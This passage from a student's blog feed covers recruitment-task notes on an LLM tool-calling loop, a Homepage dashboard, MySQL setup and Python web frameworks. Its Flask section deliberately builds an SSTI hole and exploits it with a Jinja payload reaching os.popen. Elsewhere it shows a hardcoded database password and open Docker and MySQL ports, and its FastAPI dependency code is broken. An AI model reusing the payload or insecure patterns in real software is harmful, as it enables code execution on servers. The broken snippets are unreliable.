\u0026#34;properties\u0026#34;: {\u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } } ] def main(): while True: user_input = input(\u0026#34;\\n你：\u0026#34;) if user_input.lower() in [\u0026#34;exit\u0026#34;, \u0026#34;quit\u0026#34;, \u0026#34;退出\u0026#34;]: print(\u0026#34;AI：拜拜~\u0026#34;) break # 将用户输入加入Agent A的上下文 messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # Agent A：拆解任务并生成工具调用计划 while True: # 处理多轮工具调用 try: agent_a_response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages_a, tools=tools, tool_choice=\u0026#34;auto\u0026#34; ) agent_a_msg = agent_a_response.choices[0].message messages_a.append(agent_a_msg) except Exception as e: print(f\u0026#34;API调用错误: {str(e)}\u0026#34;) break # 检查是否需要工具调用 if not hasattr(agent_a_msg, \u0026#39;tool_calls\u0026#39;) or not agent_a_msg.tool_calls: # 无需工具调用，直接输出结果 print(f\u0026#34;AI：{agent_a_msg.content}\u0026#34;) break # 处理所有工具调用 for tool_call in agent_a_msg.tool_calls: func_name = tool_call.function.name try: func_args = json.loads(tool_call.function.arguments) print(f\u0026#34;正在执行: {func_name}({json.dumps(func_args, ensure_ascii=False)})...\u0026#34;) except json.JSONDecodeError: # 工具调用参数解析失败，反馈给Agent A messages_a.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, \u0026#34;name\u0026#34;: func_name, \u0026#34;content\u0026#34;: f\u0026#34;工具调用参数解析失败：{tool_call.function.arguments}\u0026#34; }) continue # 执行工具调用 try: if func_name == \u0026#34;get_weather\u0026#34;: result = get_weather(**func_args) elif func_name == \u0026#34;web_search\u0026#34;: result = web_search(**func_args) elif func_name == \u0026#34;query_knowledge_base\u0026#34;: result = query_knowledge_base(**func_args) else: result = f\u0026#34;未知工具：{func_name}\u0026#34; except Exception as e: result = f\u0026#34;执行工具时出错: {str(e)}\u0026#34; # 将结果反馈给 Agent A messages_a.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, \u0026#34;name\u0026#34;: func_name, \u0026#34;content\u0026#34;: result }) # 保存最终回复到上下文 if hasattr(agent_a_msg, \u0026#39;content\u0026#39;) and agent_a_msg.content: messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: agent_a_msg.content}) if __name__ == \u0026#34;__main__\u0026#34;: main() 勉强跑通，但是具体的实现不太了解，感觉接口有点复杂了\nknowledge_base.md:\n1 2 # DevOps DevOps是一个大笨蛋 效果：\n知识缺漏比较多，先到这里吧\n","date":"2025-10-21T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-agent%E4%B8%93%E9%A2%98/","title":"御林招新题：Agent 专题"},{"content":"任务：安装并配置一个基础的 Homepage\n什么是 Homepage？ A modern, fully static, fast, secure fully proxied, highly customizable application dashboard with integrations for over 100 services and translations into multiple languages. Easily configured via YAML files or through docker label discovery.\n阅读文档，选择安装方式 访问 Homepage 的官方 GitHub 或官方网站。 在文档中找到“安装指南”部分，根据你已经学过的知识，选择最合适的安装方式（推荐使用 Docker 或 Docker Compose）。 根据文档说明，完成 Homepage 的安装。 理解配置，设置主页标题 在文档中找到“配置”部分，了解其配置文件的结构。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # docker compose 的配置 # 可以用 docker proxy 来反向代理，增加安全性？ # 保存为 docker-compose.yml,然后 docker-compose up -d 启动,后续直接修改 yml,docker-compose restart 即可修改配置 services: homepage: image: ghcr.io/gethomepage/homepage:latest container_name: homepage environment: HOMEPAGE_ALLOWED_HOSTS: 8.137.38.223:3000 # 补上端口 # required, may need port. See gethomepage.dev/installation/#homepage_allowed_hosts PUID: 1000 # optional, your user id PGID: 1000 # optional, your group id ports: - 3000:3000 volumes: - ~/docker/homepage/config:/app/config # Make sure your local config directory exists # - /var/run/docker.sock:/var/run/docker.sock:ro # optional, for docker integrations # 用到 docker 集成的时候需要 restart: unless-stopped mkdir -p ~/docker/homepage/config\n启动容器后自动挂载\n安装 docker-compose 加装一下（要用 pip3），又发现要 rust 环境，再加装\u0026ndash; sudo curl -L \u0026quot;https://github.com/docker/compose/releases/download/1.29.1/docker-compose-$(uname -s)-$(uname -m)\u0026quot; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose 进去了但没完全进去……\n原因是配置文件只写了域名没写端口，改一下\n原因是 HOMEPAGE_ALLOWED_HOSTS 得要配置，先设置为 “*” 禁用了（不安全，可能会被攻击）\nrestart 还没办法重载配置……需要docker-compose down然后docker-compose up -d，就可以进入了 1 2 3 4 # cofig 的配置 my-remote-docker: host: 192.168.0.101 port: 2375 根据文档说明，修改配置文件，将你的主页标题设置为你喜欢的名字（例如：“我的DevOps控制台”）。 参考：Settings - Homepage，修改完可以热加载\n有主题、外观等等\n添加你的第一个服务 在文档中找到“服务（Services）”或“应用程序（Apps）”相关的章节。 参考：Services - Homepage，修改 service.yaml\n根据文档中的示例，在配置文件中添加至少一个服务。这个服务可以是： 你在 Docker 任务中搭建的 searxng。 一个你常用的网站，例如 GitHub、你自己的博客或任何其他网站。 要求：确保你正确配置了服务的名称、图标和URL。 1 2 3 4 5 6 7 8 9 10 11 - Group One: - My Blog: icon: https://raw.githubusercontent.com/calendar0917/images/master/6a4b02385b1bb87d52812566164e8031.jpg href: https://calendar0917.github.io/ description: Welcome To My Blog! - Group Two: - 御林工作室: icon: http://recruit.yulinsec.cn/assets/favicon-CKa7I3RX.webp href: http://recruit.yulinsec.cn/#/game description: 来写几道题吧 验证 重新加载或重启你的 Homepage 服务。 在浏览器中访问你的 Homepage，确认标题已更改，并且你添加的服务图标可以正常点击，并跳转到正确的页面。 见上\n进阶服务与集成 在文档中找到“增强服务（Enhanced services）”或“小部件（Widgets）”部分。 添加一个支持状态检查的服务。例如，你可以添加你的 searxng 服务，并配置 Homepage 能够自动检查其运行状态（在线/离线）。 1 2 3 4 5 6 # service.yaml - Group Three: - Searxng: href: http://8.137.38.223:8081 siteMonitor: http://8.137.38.223:8081 icon: searxng.png 小部件定制 在文档中找到“小部件”章节，根据说明在你的主页上添加至少一个实用的小部件。 先看看有什么 Widgets(小部件) 可以用：Info Widgets - Homepage\n1 2 3 4 - datetime: text_size: xl format: timeStyle: short 添加了一个时间\n尝试添加一个 Docker 状态小部件，使其能显示你的 Docker 容器数量或状态，这需要你在文档中找到如何与 Docker API 集成的方法。 参考：using-socket-directly\n需要用到 docker socket 集成，上面的 docker-compose.yml 注释要去掉了,还要把PGID、PUID删掉，才能以 root 运行（？）\n不知道怎么使用，换方案\n参考：HomePage导航下集 常见组件的设置，这里提到了 portainer 可视化工具，刚好 homepage 有整合\n安装参考：Docker | docker安装portainer详细步骤-CSDN博客\n1 2 3 docker pull portainer/portainer-ce # 启动镜像 docker run -d -p 9000:9000 -p 9443:9443 -v /var/run/docker.sock:/var/run/docker.sock -v /dockerData/portainer:/data --restart=always --name portainer portainer/portainer-ce:latest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # setting.yaml - Group Three: - Searxng: href: http://8.137.38.223:8081 siteMonitor: http://8.137.38.223:8081 icon: searxng.png - Portainer: icon: portainer.png href: http://8.137.38.223:9000 # Portainer IP:9000 description: Portainer ping: 127.0.0.1 # Portainer IP server: my-docker showStats: true container: portainer widget: type: portainer url: https://8.137.38.223:9443 env: 2 key: ...... 遇到的问题：\n刚开始没有映射 9443 端口（用于认证？）\n重新映射只需要 docker rm \u0026hellip;，这样只会删除容器而不会删除数据卷，然后重新 docker run 即可 感觉暴露了 portainer 有点危险\nportainer 自带登录验证 效果：\n主题与布局自定义 在文档中找到“主题（Themes）”和“布局（Layout）”相关的章节。 Theme\n尝试更改 Homepage 的默认主题，或者通过修改配置文件，调整服务图标的排列顺序或分组方式。 1 2 3 4 5 # setting.yaml layout: Group One: style: row columns: 2 Group One 由单列变为双列：\n挑战：尝试在配置文件中添加自定义 CSS，改变某个元素的颜色或字体。这需要你仔细阅读文档中关于“自定义”的部分。 Custom-css-js，很简短的说明\nTo add custom css simply edit the custom.css file under your config directory, similarly for javascript you would edit custom.js.\n刚开始不知道去哪里找元素，其实直接 F12 看元素所属的类，然后修改就可以了 1 2 3 4 \u0026lt;--! custom.css 字体变为红色 --\u0026gt; .service-group-name{ color: #FF3A00; } 效果：\n","date":"2025-10-20T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-homepage/","title":"御林招新题：Homepage"},{"content":"MySQL 安装与配置 任务：在你的 Linux 系统上安装 MySQL 服务器，并进行基本的安全配置。\n具体操作：\n使用系统包管理器安装 MySQL。 1 2 3 4 5 6 7 8 9 10 11 # 下载 MySQL 5.7 的官方源，yum 默认不包含，不能直接下载 wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm # 安装源包，检查是否启用源 sudo rpm -ivh mysql57-community-release-el7-11.noarch.rpm sudo yum repolist enabled | grep \u0026#34;mysql.*-community.*\u0026#34; # 再安装 sudo yum install mysql-community-server -y # 装到这里要确认密钥，有点麻烦，换方案，直接下载 tar 包 sudo systemctl start mysqld # 安全脚本 sudo mysql_secure_installation 参考：Linux 安装Mysql 详细教程（图文教程）_linux mysql安装教程-CSDN博客\n下载 tar 包：MySQL :: Download MySQL Community Server (Archived Versions)，上传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 tar -zxvf mysql-5.7.35-linux-glibc2.12-x86_64.tar.gz # 创建目录并赋权 groupadd mysql \u0026amp;\u0026amp; useradd -r -g mysql mysql mkdir -p /data/mysql chown mysql:mysql -R /data/mysql chown mysql:mysql -R /usr/local/mysql chown mysql:mysql -R /tmp # 改配置 vim /etc/my.cnf # 见下 # 初始化 cd /usr/local/mysql/bin/ ./mysqld --defaults-file=/etc/my.cnf --basedir=/usr/local/mysql/ --datadir=/data/mysql/ --user=mysql --initialize # 启动 cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql service mysql start # 改密码操作比较繁琐，不做记录，参考文章 1 2 3 4 5 6 7 8 9 10 11 12 13 [mysqld] bind-address=0.0.0.0 port=3306 user=mysql basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock log-error=/data/mysql/mysql.err pid-file=/data/mysql/mysql.pid #character config character_set_server=utf8mb4 symbolic-links=0 explicit_defaults_for_timestamp=true 运行 MySQL 的安全脚本，设置 root 密码，并删除不安全的用户和数据库。 验证：使用 mysql -u root -p 命令登录，确认能成功进入 MySQL 命令行。 1 2 3 4 5 6 7 # 添加快速启动 sudo ln -s /usr/local/mysql/bin/mysql /usr/bin/mysql # 注意：这样安装需要添加默认启动路径，如下 # 登录 [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# mysql -u root -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. 1 2 3 4 5 6 7 8 9 10 # /etc/systemd/system/mysql.service,配置service [Unit] Description=MySQL Server After=network.target [Service] User=mysql Group=mysql ExecStart=/path/to/mysql-8.0.27/bin/mysqld --defaults-file=/path/to/mysql-8.0.27/my.cnf ExecStop=/path/to/mysql-8.0.27/bin/mysqladmin --defaults-file=/path/to/mysql-8.0.27/my.cnf shutdown Restart=on-failure [Install] WantedBy=multi-user.target 数据库操作与管理 任务：创建数据库、表，并进行数据的导入与导出。\n具体操作：\n在 MySQL 中创建一个新的数据库和一张表（例如，一个名为 students 的表，包含 id, name, score 等字段）。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 建库 CREATE DATABASE test_db; USE test_db; # 建表 CREATE TABLE students ( id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(50) NOT NULL, score DECIMAL(5,2) ); # 插入数据 INSERT INTO students (name, score) VALUES (\u0026#39;Alice\u0026#39;, 85.5), (\u0026#39;Bob\u0026#39;, 92.0), (\u0026#39;Charlie\u0026#39;, 78.5); # 这里先出去 shell 导出 # mysqldump -u root -p test_db \u0026gt; test_db_backup.sql # 删库 DROP DATABASE test_db; # 重建 CREATE DATABASE test_db; USE test_db; # 导入 mysql -u root -p test_db \u0026lt; test_db_backup.sql 1 mysqldump -u root -p test_db \u0026gt; test_db_backup.sql # 导出 插入几条数据到表中。 导出：使用 mysqldump 命令将你的数据库导出为一个 SQL 文件。 1 2 3 4 5 [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# ./mysqldump -u root -p test_db \u0026gt; test_db_backup.sql Enter password:.... [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# ls | grep test ... test_db_backup.sql # 备份的表 导入：删除你创建的数据库，然后使用导出的 SQL 文件将其恢复。 1 2 3 4 5 6 7 8 9 10 11 12 13 mysql\u0026gt; SHOW DATABASES -\u0026gt; ; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | test_db | +--------------------+ 5 rows in set (0.00 sec) 数据库性能调优 任务：了解并修改 MySQL 的关键配置参数，以提高性能。\n具体操作：\n找到 MySQL 的配置文件（通常是 /etc/mysql/my.cnf 或 /etc/my.cnf）。\n挑战：\n修改 innodb_buffer_pool_size 参数，并简要解释该参数的作用。 InnoDB 存储引擎极为关键的参数，它指定了 InnoDB 缓冲池的大小。InnoDB 缓冲池主要用于缓存表数据、索引数据等，当数据库进行查询操作时，会先从缓冲池中查找所需数据，如果能找到（即命中缓存），就可以避免从磁盘读取数据，从而极大地提高查询性能。\n修改 max_connections 参数，并解释其对系统资源和并发连接的影响。 用于设置 MySQL 服务器允许的最大并发连接数。过小会导致部分连接被拒绝，过多会占用服务器资源。\n1 2 3 4 5 6 7 [root@iZ2vc96n4f90pw7f8dfbfsZ local]# vi /etc/my.cnf [mysqld] bind-address=0.0.0.0 port=3306 ...... innodb_buffer_pool_size = 2G max_connections = 500 验证：重启 MySQL 服务，并确认新的配置已生效。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@iZ2vc96n4f90pw7f8dfbfsZ support-files]# mysql -u root -p ...... mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;innodb_buffer_pool_size\u0026#39;; +-------------------------+------------+ | Variable_name | Value | +-------------------------+------------+ | innodb_buffer_pool_size | 2147483648 | +-------------------------+------------+ 1 row in set (0.01 sec) mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;max_connections\u0026#39;; +-----------------+-------+ | Variable_name | Value | +-----------------+-------+ | max_connections | 500 | +-----------------+-------+ 1 row in set (0.00 sec) 应用程序集成与数据处理 任务：编写一个简单的应用程序，连接到你的 MySQL 数据库，执行查询和计算，并将结果导出。\n具体操作：\n语言选择：你可以使用任何你熟悉的语言（推荐使用Python）。 程序功能： 连接到你在必做部分创建的数据库。 查询 students 表中的所有数据。 计算学生的平均分数。 将所有数据（包括计算出的平均分）写入一个名为 report.csv 的 CSV 文件中。 要求：在代码中添加注释，解释连接数据库、执行查询和写入文件的关键步骤。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # 代码模板 import pymysql import csv # 数据库连接配置 db_config = { \u0026#34;host\u0026#34;: \u0026#34;8.137.38.223\u0026#34;, # MySQL 主机地址 \u0026#34;user\u0026#34;: \u0026#34;root\u0026#34;, # 数据库用户名 \u0026#34;password\u0026#34;: \u0026#34;1234\u0026#34;, # 数据库密码 \u0026#34;database\u0026#34;: \u0026#34;test_db\u0026#34; # 数据库名 } # 连接数据库 conn = pymysql.connect(**db_config) cursor = conn.cursor() # 查询 students 表中的所有数据 query_sql = \u0026#34;SELECT * FROM students\u0026#34; cursor.execute(query_sql) students_data = cursor.fetchall() # 获取表的列名 column_names = [desc[0] for desc in cursor.description] # 计算学生的平均分数 scores = [row[2] for row in students_data] # 假设分数在第三列（索引为2） average_score = sum(scores) / len(scores) if scores else 0 # 将所有数据写入 report.csv 文件 with open(\u0026#34;report.csv\u0026#34;, \u0026#34;w\u0026#34;, newline=\u0026#34;\u0026#34;) as csvfile: writer = csv.writer(csvfile) # 写入列名 writer.writerow(column_names + [\u0026#34;average_score\u0026#34;]) # 写入每行数据以及平均分 for row in students_data: writer.writerow(list(row) + [average_score]) # 关闭游标和连接 cursor.close() conn.close() print(\u0026#34;数据查询、计算及导出完成，结果已保存至 report.csv 文件\u0026#34;) pymysql 库的使用：\nconn = pymysql.connect() 建立连接，传入 host port user password database，连接成功，返回一个 conn 对象，用这个对象操作\ncursor = conn.cursor() 创建游标对象，用于执行 sql 语句\n还有conn.cursor(pymysql.cursors.DictCursor)，返回一个字典游标，用于插入字典 cursor.execute(\u0026quot;...\u0026quot;)，执行\n防注入写法：\n1 2 3 data = (\u0026#34;Alice\u0026#34;, 85.5) sql = \u0026#34;INSERT INTO students (name, score) VALUES (%s, %s)\u0026#34; cursor.execute(sql, data) 获取数据：fetchall() fetchone() fetchmany(size)\n释放资源：cursor.close() conn.close()\n自动化备份与恢复 任务：编写一个 Shell 脚本，自动化数据库的日常备份。 具体操作： 编写一个 Shell 脚本，使用 mysqldump 命令备份你的数据库。 脚本应为备份文件自动添加时间戳，例如 backup_db_2025-09-15.sql。 使用 crontab 将该脚本设置为每天凌晨自动运行一次。 验证：手动执行脚本，并检查是否成功生成了带有时间戳的备份文件。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/bin/bash DB_USER=\u0026#34;root\u0026#34; # 用户名 DB_PASSWORD=\u0026#34;....\u0026#34; # MySQL 密码 DB_NAME=\u0026#34;test_db\u0026#34; # 要备份的数据库名 BACKUP_DIR=\u0026#34;/usr/local/mysql/backup\u0026#34; # 备份文件保存目录 DATE=$(date +\u0026#34;%Y-%m-%d\u0026#34;) # 命令行中，date +%Y-%m-%d 可以格式化 date 输出 BACKUP_FILE=\u0026#34;$BACKUP_DIR/backup_${DB_NAME}_${DATE}.sql\u0026#34; # 备份文件名 # 使用 mysqldump 备份数据库 # 这里得要指定路径，系统变量没配置好 /usr/local/mysql/bin/mysqldump -u ${DB_USER} --password=${DB_PASSWORD} ${DB_NAME} \u0026gt; ${BACKUP_FILE} # 检查备份是否成功 if [ $? -eq 0 ]; then # $? 是特殊变量，返回上一条语句的执行结果，成功返回0 echo \u0026#34;备份成功！文件：${BACKUP_FILE}\u0026#34; else echo \u0026#34;备份失败！\u0026#34; fi 1 2 3 4 5 6 7 8 9 # 赋权 chmod +x mysql_backup.sh # 手动执行 ./mysql_backup.sh 备份成功！文件：/usr/local/mysql/backup/backup_test_db_2025-10-20.sql # 脚本定时执行，用 crontab 定时工具 crontab -e # 加上： 0 1 * * * /usr/local/mysql/mysql_backup.sh 不知道怎么关闭 mysql 源码编译，需要到指定目录：\n1 2 [root@iZ2vc96n4f90pw7f8dfbfsZ mysql]# cd /usr/local/mysql/bin [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# sudo ./mysqladmin -u root -p shutdown 如何看系统占用？\ntop 指令\n增强版 htop\n","date":"2025-10-20T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-mysql%E4%B8%93%E9%A2%98/","title":"御林招新题：MySQL专题"},{"content":"Flask 创建应用：创建一个简单的 Flask 应用，包含一个首页 (/) 和一个带参数的路由 (/hello/\u0026lt;name\u0026gt;)，返回个性化的问候语。 实现服务器端模板注入（SSTI）：自己设置黑名单，自己渲染输入的name，设一个SSTI的漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from flask import Flask, render_template_string, request app = Flask(__name__) # 黑名单，设置得简单了一些 blacklist = [\u0026#34;{{\u0026#34;, \u0026#34;}}\u0026#34;] @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#34;欢迎！\u0026#34; @app.route(\u0026#39;/hello/\u0026lt;name\u0026gt;\u0026#39;) def hello(name): # 故意使用不安全的模板渲染，存在 SSTI 漏洞 for word in blacklist: if word in name: return \u0026#34;输入包含非法内容！\u0026#34; # 渲染输入 template = f\u0026#34;Hello, {name}!\u0026#34; return render_template_string(template) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 漏洞成因：\n1 2 template = f\u0026#34;Hello, {name}!\u0026#34; # 将用户输入的 name 直接拼接到模板中 return render_template_string(template) # 渲染包含用户输入的模板 在引擎渲染 template 的时候，会执行其中的恶意代码\n安全写法：\n1 2 # 将 name 作为变量传入模板，这样只会当成字符串处理 return render_template(\u0026#39;hello.html\u0026#39;, name=name) 完成题目：把自己出的题，打出来（）\n相信做出来之后，一定会对Basic的SSTI靶场有更深的理解\n{%print(''.__class__.__base__.__subclasses__())%}，找可用的函数\n1 2 3 4 5 6 for i, cls in enumerate(object.__subclasses__()): try: if \u0026#39;os.\u0026#39; in cls.__init__.__globals__: print(f\u0026#34;index: {i}, class: {cls}\u0026#34;) except: continue {% print(''.__class__.__base__.__subclasses__()[n].__init__.__globals__.os.popen('calc').read()) %}，弹了计算器\nFlask 的基础知识 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @app.route(\u0026#39;/login/\u0026lt;name\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])# 指定路由、请求方式，用 request.method() 获取 def login(): # 获取参数的方法，需要借助 request 模块 username = request.form.get(\u0026#39;username\u0026#39;) # 获取表单 query = request.args.get(\u0026#39;query\u0026#39;)# ?参数 name = name # 路径参数,可以直接使用 # 响应 response = make_response(\u0026#39;自定义响应\u0026#39;, 201) # 状态码 201（创建成功） response.headers[\u0026#39;...\u0026#39;] = \u0026#39;...\u0026#39; # 添加响应头 return render_template(\u0026#39;profile.html\u0026#39;, name=username, age=20) # 模板渲染后返回 # 会话技术 app.secret_key = \u0026#39;...\u0026#39; # 设置密钥 username = request.form.get(\u0026#39;username\u0026#39;) if username == \u0026#39;admin\u0026#39;:\t# 验证用户名密码（实际需查询数据库） session[\u0026#39;username\u0026#39;] = username # 存储会话数据 return redirect(url_for(\u0026#39;dashboard\u0026#39;)) return \u0026#39;登录失败\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!-- 模板语法 --\u0026gt; \u0026lt;!-- 填充字段、条件判断 --\u0026gt; \u0026lt;h1\u0026gt;欢迎，{{ name }}！\u0026lt;/h1\u0026gt; \u0026lt;!-- 变量替换 --\u0026gt; {% if age \u0026gt;= 18 %} \u0026lt;!-- 条件判断 --\u0026gt; \u0026lt;p\u0026gt;成年\u0026lt;/p\u0026gt; {% else %} \u0026lt;p\u0026gt;未成年\u0026lt;/p\u0026gt; {% endif %} \u0026lt;!-- 循环遍历列表 --\u0026gt; \u0026lt;ul\u0026gt; {% for hobby in [\u0026#39;读书\u0026#39;, \u0026#39;运动\u0026#39;] %} \u0026lt;li\u0026gt;{{ hobby }}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; FastAPI 和 Sanic 基础 创建应用：分别为 FastAPI 和 Sanic 创建两个独立的应用。 路由与参数：每个应用都应包含一个简单的路由 (/) 和一个带参数的路由 (/items/{item_id})，并分别处理 GET 和 POST 请求。 数据校验：在 FastAPI 应用中，使用 Pydantic 模型对 POST 请求的数据进行自动校验。 FastAPI:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from fastapi import FastAPI from pydantic import BaseModel # 创建 FastAPI 应用实例 app = FastAPI() # 定义 Pydantic 模型，用于 POST 请求数据校验 class Item(BaseModel): name: str price: float is_offer: bool = None # 可选字段，默认值为 None @app.get(\u0026#34;/\u0026#34;) # 简单路由 async def read_root(): return {\u0026#34;message\u0026#34;: \u0026#34;你好\u0026#34;} @app.post(\u0026#34;/items/{item_id}\u0026#34;) # POST 请求，使用 Pydantic 模型校验数据 async def create_item(item_id: int, item: Item): # item 会自动根据 Item 模型校验请求体数据 return {\u0026#34;item_id\u0026#34;: item_id, **item.dict()} Sanic：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from sanic import Sanic from sanic.response import json # 创建 Sanic 应用实例 app = Sanic(\u0026#34;SanicApp\u0026#34;) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) # 简单路由 async def read_root(request): return json({\u0026#34;message\u0026#34;: \u0026#34;Hello from Sanic root\u0026#34;}) @app.route(\u0026#34;/items/\u0026lt;item_id\u0026gt;\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) # 带参数的路由（POST 请求） async def create_item(request, item_id): data = request.json # 手动获取并处理请求体数据（Sanic 需手动校验） if not data: return json({\u0026#34;error\u0026#34;: \u0026#34;No data provided\u0026#34;}, status=400) return json({\u0026#34;item_id\u0026#34;: item_id, **data}) 主要区别在于对 Post 的数据的处理上，Sanic 要手动处理，FastAPI 可以借助 Pydantic 模型。\n但是 Sanic 是异步非阻塞的框架，性能较高\n异步编程实践 异步函数：在 FastAPI 中，创建一个异步路由 (/async-task)，该路由模拟一个耗时操作（例如，使用 asyncio.sleep），并验证其不会阻塞其他请求。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 在原来的基础上添加函数 # import asyncio 补充 @app.get(\u0026#34;/sync\u0026#34;) def sync_heavy_task(): # 同步函数（用于对比，会阻塞） time.sleep(3) # 模拟耗时 3 秒的同步操作 return \u0026#34;同步任务完成\u0026#34; @app.get(\u0026#34;/async\u0026#34;) # 异步路由（模拟耗时操作，不会阻塞） async def async_task(): start_time = time.time() await asyncio.sleep(3) # 模拟异步耗时操作（非阻塞） end_time = time.time() return { \u0026#34;message\u0026#34;: \u0026#34;异步任务完成\u0026#34;, \u0026#34;duration\u0026#34;: end_time - start_time } 启动：uvicorn fastapi_test:app --reload --port 8001\n测试过程中发现，需要给上面加上 --worker 1，设置为单线程 用命令行 curl 的时候，没有效果，同步异步看不出差别，不知道为什么 用浏览器测，同时访问 /sync 时，明显不同步；同时访问 /async，基本同步； 但是一个先访问 /sync，另一个访问 /，是可以访问到 / 的，不知道为什么 FastAPI 运行在线程池模式，虽然单进程，但是后台有多线程池（？） 依赖注入：创建一个异步依赖函数，并在你的路由中使用它。这个依赖函数可以用来连接数据库或获取配置信息。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 async def get_db(): # 异步依赖函数（模拟数据库连接） print(\u0026#34;建立数据库连接（异步）...\u0026#34;) # conn = pymysql.connect(**db_config) 复用 mysql 的代码？ 要用 await！ conn = await aiomysql.connect(**db_config) # 异步建立连接 try: yield conn finally: await conn.close() # 异步关闭连接 try: yield conn # 提供依赖对象 finally: print(\u0026#34;关闭数据库连接（异步）...\u0026#34;) @app.get(\u0026#34;/items/{item_id}\u0026#34;) # 使用异步依赖的路由 async def read_item(item_id: int, conn = get_db()): start_time = time.time() cursor = conn.cursor() # 查询 students 表中的所有数据 query_sql = \u0026#34;SELECT * FROM students\u0026#34; cursor.execute(query_sql) students_data = cursor.fetchall() end_time = time.time() return { \u0026#34;item_id\u0026#34;: item_id, \u0026#34;db_connection\u0026#34;: db, \u0026#34;query_duration\u0026#34;: end_time - start_time } 为什么用异步依赖？ 使用异步依赖（async def get_db()） 的核心原因是为了匹配 FastAPI 的异步编程模型，避免因数据库操作阻塞整个应用，从而提升并发处理能力。 yield ？ yield 最基础的作用是创建生成器（generator），允许函数中断并返回中间结果，后续可从断点继续执行。在异步依赖中，被用来管理资源的生命周期（创建→使用→清理）。 调用时，会在 yield 处返回值并暂停，下一次调用的时候继续上一次的调用结果 await ？ await 仅能在异步函数（async def 定义） 中使用，用于暂停当前协程的执行，等待另一个异步操作（如网络请求、IO 操作）完成后再继续，期间不会阻塞事件循环（允许其他任务运行）。 可以让出当前线程，等待耗时操作完成后再继续执行 项目结构与蓝图（APIRouter） 蓝图应用：将你的 API 拆分为多个模块，例如 users 和 items。使用 APIRouter 将这些模块组织起来，并在主应用中注册。 1 2 3 4 5 6 7 8 9 10 11 12 # item.py from fastapi import APIRouter # 创建一个 APIRouter 实例，相当于一个子路由集合 item_router = APIRouter() @item_router.get(\u0026#34;/items/{item_id}\u0026#34;) def get_item(item_id: int): return {\u0026#34;item_id\u0026#34;: item_id, \u0026#34;message\u0026#34;: \u0026#34;获取物品信息\u0026#34;} @item_router.post(\u0026#34;/items/\u0026#34;) def create_item(name: str, price: float): return {\u0026#34;name\u0026#34;: name, \u0026#34;price\u0026#34;: price, \u0026#34;message\u0026#34;: \u0026#34;创建物品成功\u0026#34;} 1 2 3 4 5 6 7 8 9 10 11 # user.py from fastapi import APIRouter user_router = APIRouter() @user_router.get(\u0026#34;/users/{user_id}\u0026#34;) def get_user(user_id: int): return {\u0026#34;user_id\u0026#34;: user_id, \u0026#34;message\u0026#34;: \u0026#34;获取用户信息\u0026#34;} @user_router.post(\u0026#34;/users/\u0026#34;) def create_user(name: str): return {\u0026#34;name\u0026#34;: name, \u0026#34;message\u0026#34;: \u0026#34;创建用户成功\u0026#34;} 1 2 3 4 5 6 7 8 9 10 11 # main.py from fastapi import FastAPI # 导入定义好的路由模块 import user import item app = FastAPI() # 将用户路由注册到主应用，添加前缀 /users，这样访问用户相关接口需要用 /users/... app.include_router(user.user_router, prefix=\u0026#34;/users\u0026#34;) # 将物品路由注册到主应用，添加前缀 /items，访问物品相关接口需要用 /items/... app.include_router(item.item_router, 